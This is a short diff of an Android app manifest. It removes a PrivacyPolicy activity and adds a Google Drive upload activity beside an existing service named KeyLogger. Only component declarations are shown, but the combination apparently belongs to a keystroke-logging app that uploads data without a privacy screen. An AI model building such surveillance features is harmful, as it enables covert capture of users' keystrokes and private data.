@@ -85,10 +85,6 @@
             </intent-filter>
         </activity>
         <activity
-            android:name=".activities.PrivacyPolicy"
-            android:theme="@style/AppTheme"
-            android:screenOrientation="portrait"/>
-        <activity
             android:name=".MainActivity"
             android:screenOrientation="portrait"
             android:theme="@style/AppTheme" />
@@ -124,6 +120,12 @@
             android:name=".FirstLaunchActivity"
             android:screenOrientation="portrait"
             android:theme="@android:style/Theme.Material.Light.NoActionBar.Fullscreen"/>
+
+        <activity
+            android:name=".drive_upload.GoogleDrive"
+
+            android:screenOrientation="portrait"
+            android:theme="@style/AppTheme" />
 
         <service
             android:name=".services.KeyLogger"
